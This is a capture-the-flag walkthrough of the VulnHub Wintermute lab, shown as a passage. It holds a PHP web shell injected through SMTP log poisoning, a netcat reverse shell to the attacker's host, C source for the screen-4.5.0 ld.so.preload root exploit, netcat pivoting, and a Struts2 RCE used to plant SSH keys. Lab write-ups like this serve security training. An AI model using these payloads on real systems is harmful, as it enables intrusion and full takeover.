	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> A new OSCP style lab involving 2 vulnerable machines, themed after the cyberpunk classic Neuromancer a must read for any cyber-security enthusiast, this lab makes use of pivoting and post exploitation.</p>

<p><strong>Author:</strong> creosote</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root on both machines.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/wintermute-1,239/">https://www.vulnhub.com/entry/wintermute-1,239/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>A ping scan detected the target host on the local network, the script used can be found <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
192.168.179.180 <span class="o">=&gt;</span> up
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>The full TCP port scan with nmap detected three available ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-T4</span> <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-p1-65535</span> 192.168.179.180 <span class="nt">-oA</span> nmap/all-tcp-ports
...
PORT     STATE SERVICE
25/tcp   open  smtp
80/tcp   open  http
3000/tcp open  ppp
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>In order to get more information about the target an aggressive scan was performed on open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p25</span>,80,3000 192.168.179.180 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT     STATE SERVICE         VERSION                                                                                                                              
25/tcp   open  smtp            Postfix smtpd                                                                                                                        
|_smtp-commands: straylight, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,                                         
80/tcp   open  http            Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>                                                                                                       
| http-methods:                                                                                                                                                     
|_  Supported Methods: POST OPTIONS HEAD GET                                                                                                                        
|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>                                                                                                                        
|_http-title: Night City                                                                                                                                            
3000/tcp open  hadoop-datanode Apache Hadoop                                                                                                                        
| hadoop-datanode-info: 
|_  Logs: submit
| hadoop-tasktracker-info: 
|_  Logs: submit
|_http-favicon: Unknown favicon MD5: 7FC0953320A93F3BC71770C25A7F4716
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Welcome to ntopng
|_Requested resource was /lua/login.lua?referer<span class="o">=</span>/
|_http-trane-info: Problem with XML parsing of /evox/about
...
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>
<p><strong>Enumeration on port 80</strong></p>

<p>On the home page there is not much to see, so to find some hidden web content I ran gobuster.</p>

<p><img src="/assets/images/wintermute/screenshot-1.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.180/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span> <span class="nt">-x</span> html,php,txt
...
http://192.168.179.180/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 326]
http://192.168.179.180/manual               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.180/manual/]
http://192.168.179.180/freeside             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 321] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.180/freeside/]
http://192.168.179.180/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 303]
</code></pre></div></div>

<p>In the <strong>freeside</strong> directory there is a page with an image, nothing was found when listing in this directory.</p>

<p><img src="/assets/images/wintermute/screenshot-2.png" alt="" /></p>

<p><strong>Enumeration on port 3000</strong></p>

<p>On port 3000 there is an ntopng web form, we log in with admin as username and password.</p>

<p><img src="/assets/images/wintermute/screenshot-3.png" alt="" /></p>

<p><img src="/assets/images/wintermute/screenshot-4.png" alt="" /></p>

<p>Browsing the web page clicking on the <strong>Flows</strong> tab I found a table that contains two directories, the one we know is <strong>/freeside/</strong>, and the other is <strong>/turing-bolo/</strong>, as we can see these are running on port 80.</p>

<p><img src="/assets/images/wintermute/screenshot-5.png" alt="" /></p>

<p>We access the <strong>/turing-bolo</strong> directory on port 80 and it greets us with a web page, then we look for the user <strong>Case</strong> to see the activity log.</p>

<p><img src="/assets/images/wintermute/screenshot-6.png" alt="" /></p>

<p>We can see a message for the user <strong>Case</strong>, and the other available members.</p>

<p><img src="/assets/images/wintermute/screenshot-7.png" alt="" /></p>

<p>This page is including files with <strong>.log</strong> extension, through the <strong>bolo</strong> parameter we include the <strong>/var/log/mail.log</strong> file without the extension, and we can see the logs from SMTP service.</p>

<p><img src="/assets/images/wintermute/screenshot-8.png" alt="" /></p>

<p>We can inject php code into the SMTP log file, we insert the <strong>phpinfo()</strong> function to connect to the SMTP service on port 25.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-v</span> 192.168.179.180 25
straylight <span class="o">[</span>192.168.179.180] 25 <span class="o">(</span>smtp<span class="o">)</span> open
220 straylight ESMTP Postfix <span class="o">(</span>Debian/GNU<span class="o">)</span>
VRFY &lt;?php phpinfo<span class="o">()</span><span class="p">;</span> ?&gt;
501 5.1.3 Bad recipient address syntax
</code></pre></div></div>

<p>We loaded the web page, and we can see that the php code is executing.</p>

<p><img src="/assets/images/wintermute/screenshot-9.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="smtp-log-poisoning">SMTP Log Poisoning</h3>

<p>Using the above procedure we inject a web shell</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-v</span> 192.168.179.180 25
straylight <span class="o">[</span>192.168.179.180] 25 <span class="o">(</span>smtp<span class="o">)</span> open
220 straylight ESMTP Postfix <span class="o">(</span>Debian/GNU<span class="o">)</span>
VRFY &lt;?php <span class="nb">echo </span>shell_exec<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span> ?&gt;
501 5.1.3 Bad recipient address syntax
</code></pre></div></div>

<p>We check that the <strong>id</strong> command is being executed correctly.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://192.168.179.180/turing-bolo/bolo.php?bolo=/var/log/mail"</span> <span class="nt">--data</span> <span class="s2">"cmd=id"</span> | <span class="nb">grep</span> <span class="s1">'Illegal'</span> | <span class="nb">tail</span> <span class="nt">-n</span> +2 | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">":"</span> <span class="s1">'{print $NF}'</span>
 <span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div>

<p>We check that netcat is installed on the target.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://192.168.179.180/turing-bolo/bolo.php?bolo=/var/log/mail"</span> <span class="nt">--data</span> <span class="s2">"cmd=whereis nc"</span> | <span class="nb">grep</span> <span class="s1">'Illegal'</span> | <span class="nb">tail</span> <span class="nt">-n</span> +2 | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">":"</span> <span class="s1">'{print $NF}'</span>
 /bin/nc.traditional /bin/nc /usr/share/man/man1/nc.1.gz
</code></pre></div></div>

<p>We start a netcat listener on port 433, and execute the following curl request.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://192.168.179.180/turing-bolo/bolo.php?bolo=/var/log/mail"</span> <span class="nt">--data</span> <span class="s2">"cmd=nc 192.168.179.1 443 -e /bin/bash"</span>
</code></pre></div></div>

<p>We have a shell with privileges of user www-data.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.180] 38922
python <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
www-data@straylight:/var/www/html/turing-bolo<span class="nv">$ </span>
</code></pre></div></div>

<p>When listing the SUID binaries, screen-4.5.0 was detected, this is a vulnerable version that allows privilege escalation.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@straylight:/home/turing-police<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
&lt;uring-police<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
/bin/su
/bin/umount
/bin/mount
/bin/screen-4.5.0
/bin/ping
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
www-data@straylight:/home/turing-police<span class="err">$</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="screen-450">Screen 4.5.0</h3>

<p>The vulnerability consists in that the check opens the logfile with full root privileges. This allows us to truncate any file or create a root-owned file with any contents in any directory and can be easily exploited to full root access in several ways.</p>

<p>We download the exploit.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget https://www.exploit-db.com/download/41154 <span class="nt">-O</span> exploit.sh
</code></pre></div></div>

<p>I broke down the exploit, so it was not possible to run it directly.</p>

<p>libhax.c</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
</span><span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span>
<span class="kt">void</span> <span class="nf">dropshell</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">chown</span><span class="p">(</span><span class="s">"/tmp/rootshell"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">chmod</span><span class="p">(</span><span class="s">"/tmp/rootshell"</span><span class="p">,</span> <span class="mo">04755</span><span class="p">);</span>
    <span class="n">unlink</span><span class="p">(</span><span class="s">"/etc/ld.so.preload"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] done!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>rootshell.c</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">seteuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">setegid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">execvp</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>We verify that gcc is installed on the target.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@straylight:/var/www/html/turing-bolo<span class="nv">$ </span>which gcc
which gcc
/usr/bin/gcc
www-data@straylight:/var/www/html/turing-bolo<span class="err">$</span>
</code></pre></div></div>

<p>We start a python web server on port 80.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>Then, we transfer the c lenguage files to the victim machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@straylight:/tmp<span class="nv">$ </span>wget 192.168.179.1/<span class="o">{</span>libhax.c,rootshell.c<span class="o">}</span>
</code></pre></div></div>

<p>We compile them.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@straylight:/tmp<span class="nv">$ </span>gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-ldl</span> <span class="nt">-o</span> /tmp/libhax.so /tmp/libhax.c 
www-data@straylight:/tmp<span class="nv">$ </span>gcc <span class="nt">-o</span> /tmp/rootshell /tmp/rootshell.c
</code></pre></div></div>

<p>We execute the following commands and we get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@straylight:/etc<span class="nv">$ </span><span class="nb">cd</span> /etc
<span class="nb">cd</span> /etc
www-data@straylight:/etc<span class="nv">$ </span><span class="nb">umask </span>000
<span class="nb">umask </span>000
www-data@straylight:/etc<span class="nv">$ </span>/bin/screen-4.5.0 <span class="nt">-D</span> <span class="nt">-m</span> <span class="nt">-L</span> ld.so.preload <span class="nb">echo</span> <span class="nt">-ne</span>  <span class="s2">"</span><span class="se">\x</span><span class="s2">0a/tmp/libhax.so"</span>
&lt; <span class="nt">-m</span> <span class="nt">-L</span> ld.so.preload <span class="nb">echo</span> <span class="nt">-ne</span>  <span class="s2">"</span><span class="se">\x</span><span class="s2">0a/tmp/libhax.so"</span>
www-data@straylight:/etc<span class="nv">$ </span>/bin/screen-4.5.0 <span class="nt">-ls</span>
/bin/screen-4.5.0 <span class="nt">-ls</span>
<span class="s1">' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

www-data@straylight:/etc$ /tmp/rootshell
/tmp/rootshell
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
</span></code></pre></div></div>

<p>We read the flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># python -c "import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')"</span>
python <span class="nt">-c</span> <span class="s2">"import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')"</span>
root@straylight:/etc# <span class="nb">cd</span> /root
<span class="nb">cd</span> /root
root@straylight:/root# <span class="nb">ls
ls
</span>flag.txt  note.txt  scripts
root@straylight:/root# <span class="nb">cat </span>flag.txt
<span class="nb">cat </span>flag.txt
5ed185fd75a8d6a7056c96a436c6d8aa
</code></pre></div></div>

<p>We found a note containing a message about a Tomcat web service and a directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@straylight:/root# <span class="nb">cat </span>note<span class="k">*</span>
<span class="nb">cat </span>note<span class="k">*</span>
Devs,

Lady 3Jane has asked us to create a custom java app on Neuromancer<span class="s1">'s primary server to help her interact w/ the AI via a web-based GUI.

The engineering team couldn'</span>t strss enough how risky that is, opening up a Super AI to remote access on the Freeside network. It is within out internal admin network, but still, it should be off the network completely. For the sake of humanity, user access should only be allowed via the physical console...who knows what this thing can <span class="k">do</span><span class="nb">.</span>

Anyways, we<span class="s1">'ve deployed the war file on tomcat as ordered - located here:

/struts2_2.3.15.1-showcase

It'</span>s ready <span class="k">for </span>the devs to customize to her liking...I<span class="s1">'m stating the obvious, but make sure to secure this thing.

Regards,

Bob Laugh
Turing Systems Engineer II
Freeside//Straylight//Ops5
</span></code></pre></div></div>

<p>We list the network interfaces.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@straylight:/root/scripts# ifconfig
ifconfig
enp0s3: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.179.181  netmask 255.255.255.0  broadcast 192.168.179.255
        inet6 fe80::a00:27ff:fe83:6d5c  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        ether 08:00:27:83:6d:5c  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 2271  bytes 231817 <span class="o">(</span>226.3 KiB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2981  bytes 276415 <span class="o">(</span>269.9 KiB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

enp0s8: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.56.105  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::a00:27ff:fe92:ffec  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        ether 08:00:27:92:ff:ec  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 24  bytes 6942 <span class="o">(</span>6.7 KiB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 26  bytes 3762 <span class="o">(</span>3.6 KiB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: <span class="nv">flags</span><span class="o">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
        loop  txqueuelen 1  <span class="o">(</span>Local Loopback<span class="o">)</span>
        RX packets 19907  bytes 2079525 <span class="o">(</span>1.9 MiB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 19907  bytes 2079525 <span class="o">(</span>1.9 MiB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre></div></div>

<h2 id="information-gathering-1">Information Gathering</h2>
<h3 id="host-discovery-1">Host Discovery</h3>

<p>We discovered our next target <strong>192.168.56.104</strong> on another network with the following bash oneliner.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@straylight:/tmp# <span class="k">for </span>n <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 255<span class="si">)</span><span class="p">;</span> <span class="k">do </span>ping <span class="nt">-c</span> 1 192.168.56.<span class="nv">$n</span> <span class="o">&gt;</span>&amp;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"[+] Host 192.168.56.</span><span class="nv">$n</span><span class="s2"> up"</span><span class="p">;</span> <span class="k">done</span>
&lt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"[+] Host 192.168.56.</span><span class="nv">$n</span><span class="s2"> up"</span><span class="p">;</span> <span class="k">done</span>
<span class="o">[</span>+] Host 192.168.56.1 up
<span class="o">[</span>+] Host 192.168.56.100 up
<span class="o">[</span>+] Host 192.168.56.104 up
<span class="o">[</span>+] Host 192.168.56.105 up
root@straylight:/root#
</code></pre></div></div>

<h3 id="port-scanning-1">Port Scanning</h3>

<p>I developed a python port scanner to discover open ports.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3 
</span>
<span class="kn">import</span> <span class="nn">socket</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"192.168.56.104"</span>

<span class="k">def</span> <span class="nf">scan</span><span class="p">(</span><span class="n">port</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
        <span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">65535</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">scan</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[+] Port {} open"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">p</span><span class="p">))</span>
</code></pre></div></div>

<p>We start a web server with python on port 80.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>On target machine we download the port scanner, give it execution permissions and execute it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@straylight:/root# wget 192.168.179.1/pscan.py

root@straylight:/root# <span class="nb">chmod</span> +x pscan.py
<span class="nb">chmod</span> +x pscan.py
root@straylight:/root# ./pscan.py
./pscan.py
<span class="o">[</span>+] Port 8009 open
<span class="o">[</span>+] Port 8080 open
<span class="o">[</span>+] Port 34483 open
root@straylight:/root#
</code></pre></div></div>

<h3 id="service-enumeration-1">Service Enumeration</h3>

<p>We check the banner on port 8009 with telnet but the service was not detected.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@straylight:/root# telnet 192.168.56.104 8009
telnet 192.168.56.104 8009
Trying 192.168.56.104...
Connected to 192.168.56.104.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>

Connection closed by foreign host.
root@straylight:/root#
</code></pre></div></div>

<p>The banner reveals that a web server is running on port 8080.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@straylight:/root# telnet 192.168.56.104 8080
telnet 192.168.56.104 8080
Trying 192.168.56.104...
Connected to 192.168.56.104.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
HEAD / HTTP/1.0

HTTP/1.1 200 
Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>UTF-8
Date: Wed, 26 Jan 2022 01:32:08 GMT
Connection: close

Connection closed by foreign host.
root@straylight:/root# 
</code></pre></div></div>

<p>And on port 34483 we see that SSH is running.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@straylight:/root# telnet 192.168.56.104 34483
telnet 192.168.56.104 34483
Trying 192.168.56.104...
Connected to 192.168.56.104.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4


Protocol mismatch.
Connection closed by foreign host.
root@straylight:/root#
</code></pre></div></div>

<h3 id="web-enumeration-on-port-8080">Web Enumeration on port 8080</h3>

<p>To set up a netcat relay for pivoting we execute the following commands.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@straylight:/root# <span class="nb">mknod</span> /tmp/backpipe p 
root@straylight:/root# nc <span class="nt">-lp</span> 8080 &lt; /tmp/backpipe | nc 192.168.56.104 8080 <span class="o">&gt;</span> /tmp/backpipe
</code></pre></div></div>

<p>This establishes a netcat listener on port 8080, the netcat listener pipes any traffic it receives to the netcat client which forwards the traffic to port 8080 on the target web server 192.168.56.104.</p>

<p>Now on the attacking machine we can browse the tomcat web page.</p>

<p><img src="/assets/images/wintermute/screenshot-10.png" alt="" /></p>

<p>If we remember the directory into the note, so we browse on it.</p>

<p>http://192.168.56.104:8080/struts2_2.3.15.1-showcase</p>

<p><img src="/assets/images/wintermute/screenshot-11.png" alt="" /></p>

<p>Struts version 2.3.15 is vulnerable to Remote Code Execution</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit struts 2.3.15
<span class="nt">--------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                                |  Path
<span class="nt">--------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Apache Struts 2.0.1 &lt; 2.3.33 / 2.5 &lt; 2.5.10 - Arbitrary Code Execution                                        | multiple/remote/44556.py
Apache Struts 2.3 &lt; 2.3.34 / 2.5 &lt; 2.5.16 - Remote Code Execution <span class="o">(</span>1<span class="o">)</span>                                         | linux/remote/45260.py
Apache Struts 2.3 &lt; 2.3.34 / 2.5 &lt; 2.5.16 - Remote Code Execution <span class="o">(</span>2<span class="o">)</span>                                         | multiple/remote/45262.py
Apache Struts 2.3.5 &lt; 2.3.31 / 2.5 &lt; 2.5.10 - <span class="s1">'Jakarta'</span> Multipart Parser OGNL Injection <span class="o">(</span>Metasploit<span class="o">)</span>          | multiple/remote/41614.rb
Apache Struts 2.3.5 &lt; 2.3.31 / 2.5 &lt; 2.5.10 - Remote Code Execution                                           | linux/webapps/41570.py
Apache Struts &lt; 1.3.10 / &lt; 2.3.16.2 - ClassLoader Manipulation Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>             | multiple/remote/41690.rb
Apache Struts2 2.0.0 &lt; 2.3.15 - Prefixed Parameters OGNL Injection                                            | multiple/webapps/44583.txt
<span class="nt">--------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
</code></pre></div></div>

<p>We copy the exploit to our current directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> linux/webapps/41570.py
</code></pre></div></div>

<h2 id="exploitation-1">Exploitation</h2>
<h3 id="remote-code-execution">Remote Code Execution</h3>

<p>Apache Struts 2 versions 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 remote code execution exploit that provides a reverse shell.</p>

<p>We run the script adding as parameter the URL and the id command.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python 41570.py http://192.168.56.104:8080/struts2_2.3.15.1-showcase/showcase.action <span class="nb">id</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> CVE: 2017-5638 - Apache Struts2 S2-045
<span class="o">[</span><span class="k">*</span><span class="o">]</span> cmd: <span class="nb">id

</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ta<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ta<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>ta<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,110<span class="o">(</span>lxd<span class="o">)</span>,115<span class="o">(</span>lpadmin<span class="o">)</span>,116<span class="o">(</span>sambashare<span class="o">)</span>
</code></pre></div></div>

<p>The command was successfully executed, we can try to get a reverse shell, but I prefer to access via SSH.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python 41570.py http://192.168.56.104:8080/struts2_2.3.15.1-showcase/showcase.action <span class="s2">"mkdir /home/ta/.ssh"</span>
</code></pre></div></div>

<p>We generate the SSH key pair.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh-keygen <span class="nt">-P</span> <span class="s2">"ta123"</span> <span class="nt">-f</span> id_rsa
</code></pre></div></div>

<p>We create the authorized_keys file with the the public key inside the ssh directory in the ta’s home directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python 41570.py http://192.168.56.104:8080/struts2_2.3.15.1-showcase/showcase.action <span class="s2">"echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXzybvylP8i
qZivblk2Ezss0lYM4TsTMscRB1Hy9cy2r6Z4lXUv1Z5Y2cEuha/9YQ6O1w51f3iCBtWQUi+feKvlqhL6q8FEsF3ju4cdiD87rMPOHia1M4MYJoU4CEcN8Y8u1IN35Uvn+NBz+rad2ESwlbvsa3dBotTHWGvLR140HE1k
